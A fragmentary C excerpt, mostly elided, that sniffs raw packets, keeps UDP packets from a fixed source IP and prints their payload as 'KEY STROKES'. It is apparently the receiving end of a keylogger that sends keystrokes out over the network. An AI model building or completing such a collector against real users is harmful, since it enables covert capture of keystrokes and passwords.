...
static void printStrokes(unsigned char *data,unsigned char *buffer,int data_size) //print data
{
    printf("\KEY STROKES:\n");
    while(data<(buffer+data_size))
    {
        printf("%c ",*data); //print data 
        data++;
    }
    printf("\n\n");
}
    ...
    while (1)
    {
        ...
        else
        {
            ...
            if (ntohs(eth_p->packet_type) == 2048) //packet type is ipv4
            {
                ...
                if (ip_p->protocol == 17 && SRC_IP0 == ip_p->s_addr[0] && SRC_IP1 == ip_p->s_addr[1] && SRC_IP2 == ip_p->s_addr[2] && SRC_IP3 == ip_p->s_addr[3]) //udp protocol
                {
                    printf("\n******************UDP PACKET******************");
                    ...
                    printStrokes(data,buffer,data_size);
                }
            }
        }
    }
